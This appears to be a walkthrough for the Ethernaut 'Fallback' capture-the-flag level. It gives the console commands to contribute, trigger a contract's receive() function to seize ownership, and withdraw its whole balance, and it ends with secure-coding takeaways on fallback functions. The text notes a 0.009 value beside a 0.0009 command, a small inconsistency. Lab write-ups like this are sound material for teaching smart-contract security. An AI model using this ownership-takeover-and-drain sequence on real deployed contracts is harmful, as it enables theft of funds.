# Level 1: FallBack

**Ethernaut Level 1 : Fallback**

It is best practice to implement a **simple** `Fallback` function if you want your smart contract to ***generally* receive Ether from other contracts and wallets —> Because it initiate the smart contract to act like a wallet**

Bad practice: you should not reassign contract ownership in a fallback function

Anyone can call a fallback function by:

1. Calling a **function that doesn’t exist** inside the contract, or
2. Calling a function **without passing in required data**, or
3. Sending **Ether** **without any data** to the contract

To resolve the challenge we just have to send eth with respecting the conditions  such that its `receive()`function is invoked & makes the `msg.sender` (i.e. `player`), the owner of contract.

1. First satify the first condition : sending less than 0.001 eth —> 0.009 : `contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')})`
2. Then Check it : `contract.getContribution().then(v => v.toString())`
3. Send Any non-zero amount of ether to the contract : Send ether to contract : `await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})`
4. Reduce the balance to 0 : `contract.withdraw()`

### Key Security Takeaways

- If you implement a fallback function, **keep it simple**
- Use fallback functions to **emit payment events to the transaction log**
- Use fallback functions to **check simple conditional requirements**
- **Think twice** before using fallback functions to change contract ownership, transfer funds, support low-level function calls, and more.